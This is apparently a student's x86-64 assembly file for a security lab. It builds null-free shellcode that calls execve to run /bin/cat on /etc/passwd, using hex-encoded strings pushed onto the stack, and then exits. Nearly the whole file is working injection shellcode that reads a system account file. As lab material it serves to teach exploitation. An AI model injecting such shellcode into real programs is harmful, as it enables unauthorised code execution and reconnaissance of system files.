#Alisha Patel
#Shellcode for Lab 7

.global _start
.text

_start: 
	#for syscall(59, "/bin/cat", {"/bin/cat", "/etc/passwd", NULL}, NULL)
	#to run the executable; ./shellcode64.bin after make
	#r < payload
		
	#mov $argv0, %rdi	#the filename is /bin/cat
	#mov $argv, %rsi		#the entire argv[] as rsi
	#xor %rdx, %rdx		#the envp is NULL as rdx
	#mov $59, %rax 		#syscall 59 is execve
	#syscall

	#for exit purposes
	#mov $60, %rax 
	#xor %rdi, %rdi
	#syscall

	#envp: \0
	xor %rdx, %rdx
	push %rdx

	#bin/cat
	mov $0x7461632f6e69622f, %r10
	push %r10
	mov %rsp, %rdi

	#\0
	push %rdx 

	#/etc/passwd
	mov $0x6477737361702f63, %r10
	push %r10
	mov $0x74652f2f2f2f2f2f, %r10
	push %r10
	mov %rsp, %rcx

	#push \0 and rcx, rdi, rsp
	push %rdx
	push %rcx
	push %rdi
	mov %rsp, %rsi
	
	#syscall
	xor %al, %al	
	mov $59, %al
	syscall

	#exit
	xor %al, %al
	mov $60, %al
	xor %rdi, %rdi
	syscall

argv:
	.quad argv0 		#"/bin/cat"
	.quad argv1		#"/etc/passwd"
	.quad 0
argv0:
	.ascii "tac/nib/\0"
argv1:
	.ascii "dwssap/c"
	.ascii "te//////\0"
 
